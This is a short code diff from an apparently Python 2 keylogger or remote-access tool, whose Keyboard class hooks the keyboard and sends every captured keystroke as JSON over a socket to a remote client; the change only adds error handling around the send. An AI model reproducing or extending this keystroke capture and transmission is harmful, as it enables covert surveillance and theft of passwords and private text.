@@ -22,7 +22,11 @@ class Keyboard(object):
 	def captureKeys(self,socketClient, size):
 		def sendKey(event):
 			data = json.dumps({'type': 6, 'code': 1 ,'status' : 'OK', 'keyboard': str(event)})
-			socketClient.sendall(data)
+			try:
+				socketClient.sendall(data)
+			except:
+				print "Fail send Key to Cliet"
+				return
 		
 		self.__hook = HookManager()
 		self.__hook.HookKeyboard()
